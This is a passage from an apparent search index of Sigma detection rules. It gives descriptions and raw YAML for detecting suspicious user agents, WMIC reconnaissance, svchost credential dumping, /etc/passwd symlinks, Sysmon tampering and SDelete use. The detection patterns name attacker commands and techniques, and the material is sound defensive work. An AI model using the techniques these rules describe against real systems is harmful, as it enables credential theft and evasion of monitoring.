- \u0026#39; Mozilla/\u0026#39; # leading space - \u0026#39;Mozila/\u0026#39; # single \u0026#39;l\u0026#39; - \u0026#39;Mozilla/4.0 (compatible; MSIE 6.0; MS Web Services Client Protocol\u0026#39; # https://twitter.com/NtSetDefault/status/1303643299509567488 selection2: c-useragent|contains: - \u0026#39; (compatible;MSIE \u0026#39; # typical typo - missing space - \u0026#39;.0;Windows NT \u0026#39; # typical typo - missing space selection3: c-useragent: - \u0026#39;_\u0026#39; - \u0026#39;CertUtil URL Agent\u0026#39; # https://twitter.com/stvemillertime/status/985150675527974912 - \u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0)\u0026#39; # CobaltStrike Beacon https://unit42.paloaltonetworks.com/tracking-oceanlotus-new-downloader-kerrdown/ - \u0026#39;Mozilla/5.0 (Windows NT 6.3; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0\u0026#39; # used by APT28 malware https://threatvector.cylance.com/en_us/home/inside-the-apt28-dll-backdoor-blitz.html - \u0026#39;HTTPS\u0026#39; # https://twitter.com/stvemillertime/status/1204437531632250880 falsepositives: c-useragent: \u0026#39;Mozilla/3.0 * Acrobat *\u0026#39; # Acrobat with linked content condition: ( selection1 or selection2 or selection3 ) and not falsepositives fields: - ClientIP - c-uri - c-useragent falsepositives: - Unknown level: high tags: - attack.command_and_control - attack.t1071.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/proxy/proxy_ua_suspicious.yml/","tags":["attack.command_and_control","attack.t1071.001"],"title":"Suspicious User Agent"},{"categories":null,"contents":"Detect VBoxDrvInst.exe run with parameters allowing processing INF file. This allows to create values in the registry and install drivers. For example one could use this technique to obtain persistence via modifying one of Run or RunOnce registry keys\nKnown false-positives Legitimate use of VBoxDrvInst.exe utility by VirtualBox Guest Additions installation process References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OtherBinaries/VBoxDrvInst.yml https://twitter.com/pabraeken/status/993497996179492864 Raw rule (edit) title: Suspicious VBoxDrvInst.exe Parameters id: b7b19cb6-9b32-4fc4-a108-73f19acfe262 status: test description: Detect VBoxDrvInst.exe run with parameters allowing processing INF file. This allows to create values in the registry and install drivers. For example one could use this technique to obtain persistence via modifying one of Run or RunOnce registry keys author: Konstantin Grishchenko, oscd.community references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OtherBinaries/VBoxDrvInst.yml - https://twitter.com/pabraeken/status/993497996179492864 date: 2020/10/06 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\VBoxDrvInst.exe\u0026#39; CommandLine|contains|all: - \u0026#39;driver\u0026#39; - \u0026#39;executeinf\u0026#39; condition: selection fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - Legitimate use of VBoxDrvInst.exe utility by VirtualBox Guest Additions installation process level: medium tags: - attack.defense_evasion - attack.t1112 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_vboxdrvinst.yml/","tags":["attack.defense_evasion","attack.t1112"],"title":"Suspicious VBoxDrvInst.exe Parameters"},{"categories":null,"contents":"Detects suspicious inline VBScript keywords as used by UNC2452\nKnown false-positives Unknown References https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/ Raw rule (edit) title: Suspicious VBScript UN2452 Pattern id: 20c3f09d-c53d-4e85-8b74-6aa50e2f1b61 description: Detects suspicious inline VBScript keywords as used by UNC2452 status: experimental references: - https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/ author: Florian Roth date: 2021/03/05 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;Execute\u0026#39; - \u0026#39;CreateObject\u0026#39; - \u0026#39;RegRead\u0026#39; - \u0026#39;window.close\u0026#39; - \u0026#39;\\Microsoft\\Windows\\CurrentVersion\u0026#39; filter: CommandLine|contains: - \u0026#39;\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u0026#39; condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1547.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_vbscript_unc2452.yml/","tags":["attack.persistence","attack.t1547.001"],"title":"Suspicious VBScript UN2452 Pattern"},{"categories":null,"contents":"Detects suspicious VSFTPD error messages that indicate a fatal or suspicious error that could be caused by exploiting attempts\nKnown false-positives Unknown References https://github.com/dagwieers/vsftpd/ Raw rule (edit) title: Suspicious VSFTPD Error Messages id: 377f33a1-4b36-4ee1-acee-1dbe4b43cfbe status: test description: Detects suspicious VSFTPD error messages that indicate a fatal or suspicious error that could be caused by exploiting attempts author: Florian Roth references: - https://github.com/dagwieers/vsftpd/ date: 2017/07/05 modified: 2021/11/27 logsource: product: linux service: vsftpd detection: keywords: - \u0026#39;Connection refused: too many sessions for this address.\u0026#39; - \u0026#39;Connection refused: tcp_wrappers denial.\u0026#39; - \u0026#39;Bad HTTP verb.\u0026#39; - \u0026#39;port and pasv both active\u0026#39; - \u0026#39;pasv and port both active\u0026#39; - \u0026#39;Transfer done (but failed to open directory).\u0026#39; - \u0026#39;Could not set file modification time.\u0026#39; - \u0026#39;bug: pid active in ptrace_sandbox_free\u0026#39; - \u0026#39;PTRACE_SETOPTIONS failure\u0026#39; - \u0026#39;weird status:\u0026#39; - \u0026#39;couldn\u0026#39;\u0026#39;t handle sandbox event\u0026#39; - \u0026#39;syscall * out of bounds\u0026#39; - \u0026#39;syscall not permitted:\u0026#39; - \u0026#39;syscall validate failed:\u0026#39; - \u0026#39;Input line too long.\u0026#39; - \u0026#39;poor buffer accounting in str_netfd_alloc\u0026#39; - \u0026#39;vsf_sysutil_read_loop\u0026#39; condition: keywords falsepositives: - Unknown level: medium tags: - attack.initial_access - attack.t1190 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/other/lnx_susp_vsftp.yml/","tags":["attack.initial_access","attack.t1190"],"title":"Suspicious VSFTPD Error Messages"},{"categories":null,"contents":"A General detection for svchost.exe spawning rundll32.exe with command arguments like C:\\windows\\system32\\davclnt.dll,DavSetCookie. This could be an indicator of exfiltration or use of WebDav to launch code (hosted on WebDav Server).\nKnown false-positives unknown References https://github.com/OTRF/detection-hackathon-apt29/issues/17 https://threathunterplaybook.com/evals/apt29/detections/7.B.4_C10730EA-6345-4934-AA0F-B0EFCA0C4BA6.html Raw rule (edit) title: Suspicious WebDav Client Execution id: 2dbd9d3d-9e27-42a8-b8df-f13825c6c3d5 status: test description: A General detection for svchost.exe spawning rundll32.exe with command arguments like C:\\windows\\system32\\davclnt.dll,DavSetCookie. This could be an indicator of exfiltration or use of WebDav to launch code (hosted on WebDav Server). author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - https://github.com/OTRF/detection-hackathon-apt29/issues/17 - https://threathunterplaybook.com/evals/apt29/detections/7.B.4_C10730EA-6345-4934-AA0F-B0EFCA0C4BA6.html date: 2020/05/02 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\rundll32.exe\u0026#39; CommandLine|contains: \u0026#39;C:\\windows\\system32\\davclnt.dll,DavSetCookie\u0026#39; condition: selection falsepositives: - unknown level: medium tags: - attack.exfiltration - attack.t1048.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_webdav_client_execution.yml/","tags":["attack.exfiltration","attack.t1048.003"],"title":"Suspicious WebDav Client Execution"},{"categories":null,"contents":"An adversary might use WMI to list Processes running on the compromised host or list installed Software hotfix and patches.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/T1047.md https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wmic Raw rule (edit) title: Suspicious WMI Reconnaissance id: 221b251a-357a-49a9-920a-271802777cc0 status: experimental description: An adversary might use WMI to list Processes running on the compromised host or list installed Software hotfix and patches. author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/T1047.md - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wmic date: 2022/01/01 logsource: category: process_creation product: windows detection: selection: Image|endswith: \\WMIC.exe CommandLine|contains: - process - qfe filter: CommandLine|contains|all: #rule id 526be59f-a573-4eea-b5f7-f0973207634d for `wmic process call create #{process_to_execute}` - call - create condition: selection and not filter falsepositives: - Unknown level: medium tags: - attack.execution - attack.t1047 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_wmic_reconnaissance.yml/","tags":["attack.execution","attack.t1047"],"title":"Suspicious WMI Reconnaissance"},{"categories":null,"contents":"Detects WMIC executions in which a event consumer gets created in order to establish persistence\nKnown false-positives Legitimate software creating script event consumers References https://twitter.com/johnlatwc/status/1408062131321270282?s=12 https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf Raw rule (edit) title: Suspicious WMIC ActiveScriptEventConsumer Creation id: ebef4391-1a81-4761-a40a-1db446c0e625 status: experimental description: Detects WMIC executions in which a event consumer gets created in order to establish persistence references: - https://twitter.com/johnlatwc/status/1408062131321270282?s=12 - https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf author: Florian Roth date: 2021/06/25 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;ActiveScriptEventConsumer\u0026#39; - \u0026#39; CREATE \u0026#39; condition: selection fields: - CommandLine - ParentCommandLine tags: - attack.persistence - attack.t1546.003 falsepositives: - Legitimate software creating script event consumers level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_wmic_eventconsumer_create.yml/","tags":["attack.persistence","attack.t1546.003"],"title":"Suspicious WMIC ActiveScriptEventConsumer Creation"},{"categories":null,"contents":"ZipExec is a Proof-of-Concept (POC) tool to wrap binary-based tools into a password-protected zip file.\nKnown false-positives unknown References https://twitter.com/SBousseaden/status/1451237393017839616 https://github.com/Tylous/ZipExec Raw rule (edit) title: Suspicious ZipExec Execution id: 90dcf730-1b71-4ae7-9ffc-6fcf62bd0132 status: experimental description: ZipExec is a Proof-of-Concept (POC) tool to wrap binary-based tools into a password-protected zip file. references: - https://twitter.com/SBousseaden/status/1451237393017839616 - https://github.com/Tylous/ZipExec tags: - attack.execution - attack.defense_evasion - attack.t1218 - attack.t1202 author: frack113 date: 2021/11/07 logsource: category: process_creation product: windows detection: run: CommandLine|contains|all: - \u0026#39;/generic:Microsoft_Windows_Shell_ZipFolder:filename=\u0026#39; - \u0026#39;.zip\u0026#39; - \u0026#39;/pass:\u0026#39; - \u0026#39;/user:\u0026#39; delete: CommandLine|contains|all: - \u0026#39;/delete\u0026#39; - \u0026#39;Microsoft_Windows_Shell_ZipFolder:filename=\u0026#39; - \u0026#39;.zip\u0026#39; condition: run or delete falsepositives: - unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_zipexec.yml/","tags":["attack.execution","attack.defense_evasion","attack.t1218","attack.t1202"],"title":"Suspicious ZipExec Execution"},{"categories":null,"contents":"Detects when a process, such as mimikatz, accesses the memory of svchost to dump credentials\nKnown false-positives Non identified legit exectubale Raw rule (edit) title: SVCHOST Credential Dump id: 174afcfa-6e40-4ae9-af64-496546389294 description: Detects when a process, such as mimikatz, accesses the memory of svchost to dump credentials status: experimental date: 2021/04/30 author: Florent Labouyrie logsource: product: windows category: process_access tags: - attack.t1548 detection: selection_process: TargetImage|endswith: \u0026#39;\\svchost.exe\u0026#39; selection_memory: GrantedAccess: \u0026#39;0x143a\u0026#39; filter_trusted_process_access: SourceImage|endswith: - \u0026#39;*\\services.exe\u0026#39; - \u0026#39;*\\msiexec.exe\u0026#39; condition: selection_process and selection_memory and not filter_trusted_process_access falsepositives: - Non identified legit exectubale level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_access/proc_access_win_svchost_cred_dump.yml/","tags":["attack.t1548"],"title":"SVCHOST Credential Dump"},{"categories":null,"contents":"Detects suspicious command lines that look as if they would create symbolic links to /etc/passwd\nKnown false-positives Unknown References https://www.qualys.com/2021/05/04/21nails/21nails.txt Raw rule (edit) title: Symlink Etc Passwd id: c67fc22a-0be5-4b4f-aad5-2b32c4b69523 status: test description: Detects suspicious command lines that look as if they would create symbolic links to /etc/passwd author: Florian Roth references: - https://www.qualys.com/2021/05/04/21nails/21nails.txt date: 2019/04/05 modified: 2021/11/27 logsource: product: linux detection: keywords: - \u0026#39;ln -s -f /etc/passwd\u0026#39; - \u0026#39;ln -s /etc/passwd\u0026#39; condition: keywords falsepositives: - Unknown level: high tags: - attack.t1204.001 - attack.execution ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/builtin/lnx_symlink_etc_passwd.yml/","tags":["attack.t1204.001","attack.execution"],"title":"Symlink Etc Passwd"},{"categories":null,"contents":"Detects SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions.\nKnown false-positives App-V clients References https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/ Raw rule (edit) title: SyncAppvPublishingServer Execution to Bypass Powershell Restriction id: fde7929d-8beb-4a4c-b922-be9974671667 description: Detects SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions. references: - https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/ author: \u0026#39;Ensar Şamil, @sblmsrsn, OSCD Community\u0026#39; date: 2020/10/05 modified: 2021/09/11 tags: - attack.defense_evasion - attack.t1218 logsource: product: windows category: process_creation detection: selection: Image|endswith: \u0026#39;\\SyncAppvPublishingServer.exe\u0026#39; condition: selection falsepositives: - App-V clients level: medium status: deprecated ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/deprecated/process_creation_syncappvpublishingserver_exe.yml/","tags":["attack.defense_evasion","attack.t1218"],"title":"SyncAppvPublishingServer Execution to Bypass Powershell Restriction"},{"categories":null,"contents":"Use of SDelete to erase a file not the free space\nKnown false-positives System administrator Usage References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1485/T1485.md Raw rule (edit) title: Sysinternals SDelete Delete File id: a4824fca-976f-4964-b334-0621379e84c4 status: experimental author: frack113 date: 2021/06/03 description: Use of SDelete to erase a file not the free space references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1485/T1485.md tags: - attack.impact - attack.t1485 logsource: category: process_creation product: windows detection: selection: OriginalFileName: sdelete.exe filter: CommandLine|contains: - \u0026#39; -h\u0026#39; - \u0026#39; -c\u0026#39; - \u0026#39; -z\u0026#39; - \u0026#39; /?\u0026#39; condition: selection and not filter fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - System administrator Usage level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_sdelete.yml/","tags":["attack.impact","attack.t1485"],"title":"Sysinternals SDelete Delete File"},{"categories":null,"contents":"A General detection to trigger for the deletion of files by Sysinternals SDelete. It looks for the common name pattern used to rename files.\nKnown false-positives Legitime usage of SDelete References https://github.com/OTRF/detection-hackathon-apt29/issues/9 https://threathunterplaybook.com/evals/apt29/detections/4.B.4_83D62033-105A-4A02-8B75-DAB52D8D51EC.html Raw rule (edit) title: Sysinternals SDelete File Deletion id: 6ddab845-b1b8-49c2-bbf7-1a11967f64bc status: test description: A General detection to trigger for the deletion of files by Sysinternals SDelete. It looks for the common name pattern used to rename files. author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - https://github.com/OTRF/detection-hackathon-apt29/issues/9 - https://threathunterplaybook.com/evals/apt29/detections/4.B.4_83D62033-105A-4A02-8B75-DAB52D8D51EC.html date: 2020/05/02 modified: 2021/11/27 logsource: product: windows category: file_delete detection: selection: TargetFilename|endswith: - \u0026#39;.AAA\u0026#39; - \u0026#39;.ZZZ\u0026#39; condition: selection falsepositives: - Legitime usage of SDelete level: medium tags: - attack.defense_evasion - attack.t1070.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_delete/file_delete_win_sysinternals_sdelete_file_deletion.yml/","tags":["attack.defense_evasion","attack.t1070.004"],"title":"Sysinternals SDelete File Deletion"},{"categories":null,"contents":"A General detection to trigger for the creation or modification of .*\\Software\\Sysinternals\\SDelete registry keys. Indicators of the use of Sysinternals SDelete tool.\nKnown false-positives unknown References https://github.com/OTRF/detection-hackathon-apt29/issues/9 https://threathunterplaybook.com/evals/apt29/detections/4.B.2_59A9AC92-124D-4C4B-A6BF-3121C98677C3.html Raw rule (edit) title: Sysinternals SDelete Registry Keys id: 9841b233-8df8-4ad7-9133-b0b4402a9014 description: A General detection to trigger for the creation or modification of .*\\Software\\Sysinternals\\SDelete registry keys. Indicators of the use of Sysinternals SDelete tool. status: experimental date: 2020/05/02 modified: 2021/05/12 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.defense_evasion - attack.t1070.004 references: - https://github.com/OTRF/detection-hackathon-apt29/issues/9 - https://threathunterplaybook.com/evals/apt29/detections/4.B.2_59A9AC92-124D-4C4B-A6BF-3121C98677C3.html logsource: product: windows category: registry_event detection: selection: TargetObject|contains: \u0026#39;\\Software\\Sysinternals\\SDelete\u0026#39; condition: selection falsepositives: - unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_sysinternals_sdelete_registry_keys.yml/","tags":["attack.defense_evasion","attack.t1070.004"],"title":"Sysinternals SDelete Registry Keys"},{"categories":null,"contents":"Potential threat actor tampering with Sysmon manifest and eventually disabling it\nKnown false-positives unknown References https://twitter.com/Flangvik/status/1283054508084473861 https://twitter.com/SecurityJosh/status/1283027365770276866 https://securityjosh.github.io/2020/04/23/Mute-Sysmon.html https://gist.github.com/Cyb3rWard0g/cf08c38c61f7e46e8404b38201ca01c8 Raw rule (edit) title: Sysmon Channel Reference Deletion id: 18beca67-ab3e-4ee3-ba7a-a46ca8d7d0cc status: test description: Potential threat actor tampering with Sysmon manifest and eventually disabling it author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - https://twitter.com/Flangvik/status/1283054508084473861 - https://twitter.com/SecurityJosh/status/1283027365770276866 - https://securityjosh.github.io/2020/04/23/Mute-Sysmon.html - https://gist.github.com/Cyb3rWard0g/cf08c38c61f7e46e8404b38201ca01c8 date: 2020/07/14 modified: 2021/11/27 logsource: product: windows service: security detection: selection1: EventID: 4657 ObjectName|contains: - \u0026#39;WINEVT\\Publishers\\{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\u0026#39; - \u0026#39;WINEVT\\Channels\\Microsoft-Windows-Sysmon/Operational\u0026#39; ObjectValueName: \u0026#39;Enabled\u0026#39; NewValue: \u0026#39;0\u0026#39; selection2: EventID: 4663 ObjectName|contains: - \u0026#39;WINEVT\\Publishers\\{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\u0026#39; - \u0026#39;WINEVT\\Channels\\Microsoft-Windows-Sysmon/Operational\u0026#39; AccessMask: 0x10000 condition: selection1 or selection2 falsepositives: - unknown level: critical tags: - attack.defense_evasion - attack.t1112 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_sysmon_channel_reference_deletion.yml/","tags":["attack.defense_evasion","attack.t1112"],"title":"Sysmon Channel Reference Deletion"},{"categories":null,"contents":"Someone try to hide from Sysmon\nKnown false-positives legitimate administrative action References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md https://talesfrominfosec.blogspot.com/2017/12/killing-sysmon-silently.html Raw rule (edit) title: Sysmon Configuration Error id: 815cd91b-7dbc-4247-841a-d7dd1392b0a8 description: Someone try to hide from Sysmon status: experimental author: frack113 date: 2021/06/04 modified: 2022/02/09 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md - https://talesfrominfosec.blogspot.com/2017/12/killing-sysmon-silently.html tags: - attack.defense_evasion - attack.t1564 logsource: product: windows category: sysmon_error detection: selection_error: Description|contains: - \u0026#39;Failed to open service configuration with error\u0026#39; - \u0026#39;Failed to connect to the driver to update configuration\u0026#39; selection_filter: Description|contains|all: - \u0026#39;Failed to open service configuration with error\u0026#39; - \u0026#39;Last error: The media is write protected.\u0026#39; condition: selection_error and not selection_filter falsepositives: - legitimate administrative action level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/sysmon/sysmon_config_modification_error.yml/","tags":["attack.defense_evasion","attack.t1564"],"title":"Sysmon Configuration Error"},{"categories":null,"contents":"Someone try to hide from Sysmon\nKnown false-positives legitimate administrative action References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md https://talesfrominfosec.blogspot.com/2017/12/killing-sysmon-silently.html Raw rule (edit) title: Sysmon Configuration Modification id: 1f2b5353-573f-4880-8e33-7d04dcf97744 description: Someone try to hide from Sysmon status: experimental author: frack113 date: 2021/06/04 modified: 2021/09/07 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md - https://talesfrominfosec.blogspot.com/2017/12/killing-sysmon-silently.html tags: - attack.defense_evasion - attack.t1564 logsource: product: windows category: sysmon_status detection: selection_stop: State: Stopped selection_conf: - \u0026#39;Sysmon config state changed\u0026#39; condition: selection_stop or selection_conf falsepositives: - legitimate administrative action level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/sysmon/sysmon_config_modification_status.yml/","tags":["attack.defense_evasion","attack.t1564"],"title":"Sysmon Configuration Modification"},{"categories":null,"contents":"Detects System Information Discovery commands\nKnown false-positives Legitimate administrative activity References https://attack.mitre.org/techniques/T1082/ https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md Raw rule (edit) title: System Information Discovery id: f34047d9-20d3-4e8b-8672-0a35cc50dc71 description: Detects System Information Discovery commands author: \u0026#39;Pawel Mazur\u0026#39; status: experimental date: 2021/09/03 references: - https://attack.mitre.org/techniques/T1082/ - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md logsource: product: linux service: auditd detection: selection: type: PATH name: - /etc/lsb-release - /etc/redhat-release - /etc/issue selection2: type: EXECVE a0: - uname - uptime condition: selection or selection2 tags: - attack.discovery - attack.t1082 falsepositives: - Legitimate administrative activity level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_system_info_discovery.yml/","tags":["attack.discovery","attack.t1082"],"title":"System Information Discovery"},{"categories":null,"contents":"Detects system information discovery commands\nKnown false-positives Legitimate administration activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md Raw rule (edit) title: System Information Discovery id: 42df45e7-e6e9-43b5-8f26-bec5b39cc239 status: stable description: Detects system information discovery commands author: Ömer Günal, oscd.community date: 2020/10/08 modified: 2021/09/14 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md tags: - attack.discovery - attack.t1082 logsource: product: linux category: process_creation detection: selection: Image|endswith: - \u0026#39;/uname\u0026#39; - \u0026#39;/hostname\u0026#39; - \u0026#39;/uptime\u0026#39; - \u0026#39;/lspci\u0026#39; - \u0026#39;/dmidecode\u0026#39; - \u0026#39;/lscpu\u0026#39; - \u0026#39;/lsmod\u0026#39; condition: selection falsepositives: - Legitimate administration activities level: informational ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/process_creation/proc_creation_lnx_system_info_discovery.yml/","tags":["attack.discovery","attack.t1082"],"title":"System Information Discovery"},{"categories":null,"contents":"Detects usage of system utilities to discover system network connections\nKnown false-positives Legitimate activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1049/T1049.md Raw rule (edit) title: System Network Connections Discovery id: 9a7a0393-2144-4626-9bf1-7c2f5a7321db status: test description: Detects usage of system utilities to discover system network connections author: Daniil Yugoslavskiy, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1049/T1049.md date: 2020/10/19 modified: 2021/11/27 logsource: category: process_creation product: macos detection: selection: Image: - \u0026#39;/usr/bin/who\u0026#39; - \u0026#39;/usr/bin/w\u0026#39; - \u0026#39;/usr/bin/last\u0026#39; - \u0026#39;/usr/sbin/lsof\u0026#39; - \u0026#39;/usr/sbin/netstat\u0026#39; condition: selection falsepositives: - Legitimate activities level: informational tags: - attack.discovery - attack.t1049 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/macos/process_creation/proc_creation_macos_system_network_connections_discovery.yml/","tags":["attack.discovery","attack.t1049"],"title":"System Network Connections Discovery"},{"categories":null,"contents":"Detects usage of system utilities to discover system network connections\nKnown false-positives Legitimate activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1049/T1049.md Raw rule (edit) title: System Network Connections Discovery id: 4c519226-f0cd-4471-bd2f-6fbb2bb68a79 status: test description: Detects usage of system utilities to discover system network connections author: Daniil Yugoslavskiy, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1049/T1049.md date: 2020/10/19 modified: 2021/11/27 logsource: category: process_creation product: linux detection: selection: Image|endswith: - \u0026#39;/who\u0026#39; - \u0026#39;/w\u0026#39; - \u0026#39;/last\u0026#39; - \u0026#39;/lsof\u0026#39; - \u0026#39;/netstat\u0026#39; condition: selection falsepositives: - Legitimate activities level: low tags: - attack.discovery - attack.t1049 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/process_creation/proc_creation_lnx_system_network_connections_discovery.yml/","tags":["attack.discovery","attack.t1049"],"title":"System Network Connections Discovery"},{"categories":null,"contents":"Detects enumeration of local network configuration\nKnown false-positives Legitimate administration activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1016/T1016.md Raw rule (edit) title: System Network Discovery - Linux id: e7bd1cfa-b446-4c88-8afb-403bcd79e3fa status: test description: Detects enumeration of local network configuration author: Ömer Günal and remotephone, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1016/T1016.md date: 2020/10/06 modified: 2021/11/27 logsource: category: process_creation product: linux detection: selection1: Image|endswith: - \u0026#39;/firewall-cmd\u0026#39; - \u0026#39;/ufw\u0026#39; - \u0026#39;/iptables\u0026#39; - \u0026#39;/netstat\u0026#39; - \u0026#39;/ss\u0026#39; - \u0026#39;/ip\u0026#39; - \u0026#39;/ifconfig\u0026#39; - \u0026#39;/systemd-resolve\u0026#39; - \u0026#39;/route\u0026#39; selection2: CommandLine|contains: \u0026#39;/etc/resolv.conf\u0026#39; condition: selection1 or selection2 falsepositives: - Legitimate administration activities level: informational tags: - attack.discovery - attack.t1016 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/process_creation/proc_creation_lnx_system_network_discovery.yml/","tags":["attack.discovery","attack.t1016"],"title":"System Network Discovery - Linux"},{"categories":null,"contents":"Detects enumeration of local network configuration\nKnown false-positives Legitimate administration activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1016/T1016.md Raw rule (edit) title: System Network Discovery - macOS id: 58800443-f9fc-4d55-ae0c-98a3966dfb97 status: test description: Detects enumeration of local network configuration author: remotephone, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1016/T1016.md date: 2020/10/06 modified: 2021/11/27 logsource: product: macos category: process_creation detection: selection1: Image: - \u0026#39;/usr/sbin/netstat\u0026#39; - \u0026#39;/sbin/ifconfig\u0026#39; - \u0026#39;/usr/sbin/ipconfig\u0026#39; - \u0026#39;/usr/libexec/ApplicationFirewall/socketfilterfw\u0026#39; - \u0026#39;/usr/sbin/networksetup\u0026#39; - \u0026#39;/usr/sbin/arp\u0026#39; selection2: Image: \u0026#39;/usr/bin/defaults\u0026#39; CommandLine|contains|all: - \u0026#39;read\u0026#39; - \u0026#39;/Library/Preferences/com.apple.alf\u0026#39; condition: selection1 or selection2 falsepositives: - Legitimate administration activities level: informational tags: - attack.discovery - attack.t1016 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/macos/process_creation/proc_creation_macos_system_network_discovery.yml/","tags":["attack.discovery","attack.t1016"],"title":"System Network Discovery - macOS"},{"categories":null,"contents":"Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems.\nKnown false-positives Legitimate administrative activity References hhttps://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1529/T1529.md Raw rule (edit) title: \u0026#39;System Shutdown/Reboot\u0026#39; id: 4cb57c2f-1f29-41f8-893d-8bed8e1c1d2f status: test description: \u0026#39;Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems.\u0026#39; author: \u0026#39;Igor Fits, oscd.community\u0026#39; references: - hhttps://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1529/T1529.md date: 2020/10/15 modified: 2021/11/27 logsource: product: linux service: auditd detection: execve: type: \u0026#39;EXECVE\u0026#39; shutdowncmd: - \u0026#39;shutdown\u0026#39; - \u0026#39;reboot\u0026#39; - \u0026#39;halt\u0026#39; - \u0026#39;poweroff\u0026#39; init: - \u0026#39;init\u0026#39; - \u0026#39;telinit\u0026#39; initselection: - \u0026#39;0\u0026#39; - \u0026#39;6\u0026#39; condition: execve and (shutdowncmd or (init and initselection)) falsepositives: - \u0026#39;Legitimate administrative activity\u0026#39; level: informational tags: - attack.impact - attack.t1529 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_system_shutdown_reboot.yml/","tags":["attack.impact","attack.t1529"],"title":"System Shutdown/Reboot"},{"categories":null,"contents":"Adversaries may shutdown/reboot systems to interrupt access to, or aid 